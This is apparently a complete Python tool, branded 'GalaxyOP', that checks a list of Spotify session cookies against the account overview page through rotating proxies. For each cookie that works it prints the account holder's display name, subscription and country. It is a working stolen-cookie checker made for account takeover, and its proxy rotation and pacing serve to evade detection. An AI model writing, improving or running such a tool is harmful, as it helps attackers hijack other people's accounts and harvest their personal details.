import requests
from bs4 import BeautifulSoup
import random
import time
import os
from colorama import Fore, init

init(autoreset=True)
os.system("figlet GalaxyOP")

def load_proxies():
    try:
        with open('proxies.txt', 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def check_cookie(cookie, proxy=None):
    url = 'https://www.spotify.com/us/account/overview/'
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Cookie': cookie
    }

    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    try:
        ip_check = requests.get('https://api.ipify.org', proxies=proxies, timeout=10).text
        print(Fore.CYAN + f"Using Proxy IP: {ip_check}")
    except:
        pass

    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)

        if "Log Out" in response.text:
            soup = BeautifulSoup(response.text, 'html.parser')
            username = soup.find('span', {'data-testid': 'account-overview-displayname'})
            subscription = soup.find('h3')
            country = soup.find('dd', {'data-testid': 'country'})

            print(Fore.GREEN + f"[VALID] {username.text.strip() if username else 'N/A'} | {subscription.text.strip() if subscription else 'N/A'} | {country.text.strip() if country else 'N/A'}")
            return True
        else:
            print(Fore.RED + "[INVALID] Cookie Failed")
            return False
    except Exception as e:
        print(Fore.YELLOW + f"[ERROR] {str(e)}")
        return False

def main():
    try:
        with open('cookies.txt', 'r') as f:
            cookies = [line.strip() for line in f if line.strip()]
    except:
        print(Fore.RED + "Missing cookies.txt")
        return

    proxies = load_proxies()

    for cookie in cookies:
        proxy = random.choice(proxies) if proxies else None
        check_cookie(cookie, proxy)
        time.sleep(2)

if __name__ == "__main__":
    main()
